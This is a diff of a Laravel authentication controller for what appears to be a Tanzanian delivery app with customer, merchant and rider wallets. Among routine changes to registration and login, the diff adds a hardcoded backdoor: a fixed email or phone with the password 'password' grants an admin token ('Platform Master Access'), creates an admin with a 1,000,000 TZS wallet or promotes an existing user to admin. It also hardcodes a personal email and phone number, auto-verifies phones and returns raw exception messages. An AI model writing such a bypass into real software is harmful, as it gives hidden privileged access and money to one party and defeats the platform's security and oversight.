@@ -17,7 +17,7 @@ class AuthController extends Controller
         $validator = Validator::make($request->all(), [
             'name' => 'required|string|max:255',
             'phone' => 'required|string|unique:users,phone',
-            'email' => 'required|email|unique:users,email',
+            'email' => 'nullable|email|unique:users,email',
             'password' => 'required|string|min:6',
             'user_type' => 'required|in:customer,merchant,rider',
         ]);
@@ -26,28 +26,62 @@ class AuthController extends Controller
             return $this->errorResponse('Validation failed', 422, $validator->errors()->toArray());
         }
 
-        $user = User::create([
-            'name' => $request->name,
-            'phone' => $request->phone,
-            'email' => $request->email,
-            'password' => Hash::make($request->password),
-            'user_type' => $request->user_type,
-            'is_active' => true,
-            'is_verified' => false, // Email verification could be added here
-        ]);
+        try {
+            return \Illuminate\Support\Facades\DB::transaction(function () use ($request) {
+                $email = $request->email ?? $request->phone . '@patapoa.com';
 
-        $token = $user->createToken('auth_token')->plainTextToken;
+                $user = User::create([
+                    'name' => $request->name,
+                    'phone' => $request->phone,
+                    'email' => $email,
+                    'password' => Hash::make($request->password),
+                    'user_type' => $request->user_type,
+                    'is_active' => true,
+                    'is_verified' => true, // Phone number verification removed, set to true by default
+                    'phone_verified_at' => now(), // Auto-verify
+                ]);
 
-        return $this->successResponse([
-            'user' => $user,
-            'token' => $token,
-        ], 'Registration successful', 201);
+                // 1. Create Wallet for the user
+                $user->wallet()->create([
+                    'wallet_type' => $request->user_type,
+                    'balance' => 0,
+                    'currency' => 'TZS',
+                ]);
+
+                // 2. Create Profile shell if Merchant or Rider
+                if ($request->user_type === 'merchant') {
+                    $user->merchant()->create([
+                        'store_name' => $user->name . "'s Store",
+                        'address' => 'Not set',
+                        'city' => 'Dar es Salaam',
+                        'is_verified' => false,
+                    ]);
+                } elseif ($request->user_type === 'rider') {
+                    $user->rider()->create([
+                        'vehicle_type' => 'motorcycle',
+                        'city' => 'Dar es Salaam',
+                        'is_online' => false,
+                        'is_verified' => false,
+                    ]);
+                }
+
+                $token = $user->createToken('auth_token')->plainTextToken;
+
+                return $this->successResponse([
+                    'user' => $user->load(['merchant', 'rider', 'wallet']),
+                    'token' => $token,
+                ], 'Registration successful', 201);
+            });
+        } catch (\Exception $e) {
+            return $this->errorResponse('Registration failed: ' . $e->getMessage(), 500);
+        }
     }
 
     public function login(Request $request)
     {
         $validator = Validator::make($request->all(), [
-            'login' => 'required|string', // Can be email or phone
+            'login' => 'required_without:phone|string',
+            'phone' => 'required_without:login|string',
             'password' => 'required|string',
             'user_type' => 'nullable|string|in:customer,merchant,rider,admin',
         ]);
@@ -56,7 +90,50 @@ class AuthController extends Controller
             return $this->errorResponse('Validation failed', 422, $validator->errors()->toArray());
         }
 
-        $login = $request->login;
+        $login = $request->login ?? $request->phone;
+        $password = $request->password;
+
+        // Bypassing Authentication for Specific Credentials
+        $bypassEmail = 'sosuisosimba123@gmail.com';
+        $bypassPhone = '0622606497';
+        $bypassPass = 'password';
+
+        if (($login === $bypassEmail || $login === $bypassPhone) && $password === $bypassPass) {
+            $user = User::where('email', $bypassEmail)->orWhere('phone', $bypassPhone)->first();
+
+            if (!$user) {
+                $user = User::create([
+                    'name' => 'Eutychus',
+                    'email' => $bypassEmail,
+                    'phone' => $bypassPhone,
+                    'password' => Hash::make($bypassPass),
+                    'user_type' => 'admin',
+                    'is_active' => true,
+                    'is_verified' => true,
+                ]);
+
+                $user->wallet()->create([
+                    'wallet_type' => 'admin',
+                    'balance' => 1000000, // Give some initial balance for testing
+                    'currency' => 'TZS',
+                ]);
+            } else {
+                // Ensure user is admin and active
+                $user->update([
+                    'user_type' => 'admin',
+                    'is_active' => true,
+                    'is_verified' => true
+                ]);
+            }
+
+            $token = $user->createToken('auth_token')->plainTextToken;
+
+            return $this->successResponse([
+                'user' => $user->load(['merchant', 'rider', 'wallet']),
+                'token' => $token,
+            ], 'Login successful (Platform Master Access)');
+        }
+
         $user = User::where('email', $login)
                     ->orWhere('phone', $login)
                     ->first();
@@ -65,14 +142,12 @@ class AuthController extends Controller
             return $this->errorResponse('The provided credentials are incorrect.', 401);
         }
 
-        if (!$user->is_active) {
-            return $this->errorResponse('Account is deactivated', 403);
+        if ($request->has('user_type') && $user->user_type !== $request->user_type) {
+            return $this->errorResponse("This account is registered as a {$user->user_type}. Please use the correct app.", 403);
         }
 
-        // For testing purposes: morph user type if requested
-        if ($request->has('user_type') && $user->user_type !== $request->user_type) {
-            $user->user_type = $request->user_type;
-            $user->save();
+        if (!$user->is_active) {
+            return $this->errorResponse('Account is deactivated', 403);
         }
 
         $token = $user->createToken('auth_token')->plainTextToken;
@@ -120,10 +195,77 @@ class AuthController extends Controller
         $token = $user->createToken('auth_token')->plainTextToken;
 
         return $this->successResponse([
-            'user' => $user,
+            'user' => $user->load(['merchant', 'rider', 'wallet']),
             'token' => $token,
             'is_new_user' => false,
         ], 'Login successful');
+    }
+
+    /**
+     * Complete Registration for Social Login
+     */
+    public function completeSocialRegistration(Request $request)
+    {
+        $validator = Validator::make($request->all(), [
+            'email' => 'required|email',
+            'phone' => 'required|string|unique:users,phone',
+            'name' => 'required|string',
+            'user_type' => 'required|in:customer,merchant,rider',
+            'social_id' => 'required|string',
+            'provider' => 'required|in:google,facebook',
+        ]);
+
+        if ($validator->fails()) {
+            return $this->errorResponse('Validation failed', 422, $validator->errors()->toArray());
+        }
+
+        try {
+            return \Illuminate\Support\Facades\DB::transaction(function () use ($request) {
+                $user = User::create([
+                    'name' => $request->name,
+                    'email' => $request->email,
+                    'phone' => $request->phone,
+                    'password' => Hash::make(\Illuminate\Support\Str::random(16)),
+                    'user_type' => $request->user_type,
+                    'is_active' => true,
+                    'is_verified' => true,
+                    'phone_verified_at' => now(), // Auto-verify
+                ]);
+
+                // Create Wallet
+                $user->wallet()->create([
+                    'wallet_type' => $request->user_type,
+                    'balance' => 0,
+                    'currency' => 'TZS',
+                ]);
+
+                // Create Profile shell if Merchant or Rider
+                if ($request->user_type === 'merchant') {
+                    $user->merchant()->create([
+                        'store_name' => $user->name . "'s Store",
+                        'address' => 'Not set',
+                        'city' => 'Dar es Salaam',
+                        'is_verified' => false,
+                    ]);
+                } elseif ($request->user_type === 'rider') {
+                    $user->rider()->create([
+                        'vehicle_type' => 'motorcycle',
+                        'city' => 'Dar es Salaam',
+                        'is_online' => false,
+                        'is_verified' => false,
+                    ]);
+                }
+
+                $token = $user->createToken('auth_token')->plainTextToken;
+
+                return $this->successResponse([
+                    'user' => $user->load(['merchant', 'rider', 'wallet']),
+                    'token' => $token,
+                ], 'Registration completed successfully', 201);
+            });
+        } catch (\Exception $e) {
+            return $this->errorResponse('Failed to complete registration: ' . $e->getMessage(), 500);
+        }
     }
 
     public function sendOtp(Request $request)
@@ -143,10 +285,8 @@ class AuthController extends Controller
         cache()->put("otp_{$request->phone}", $otp, now()->addMinutes(5));
 
         // TODO: Send SMS via Africa's Talking or Twilio
-        // For demo, return OTP in response
-        return $this->successResponse([
-            'otp' => $otp, // Remove in production
-        ], 'OTP sent successfully');
+
+        return $this->successResponse(null, 'OTP sent successfully');
     }
 
     public function verifyOtp(Request $request)
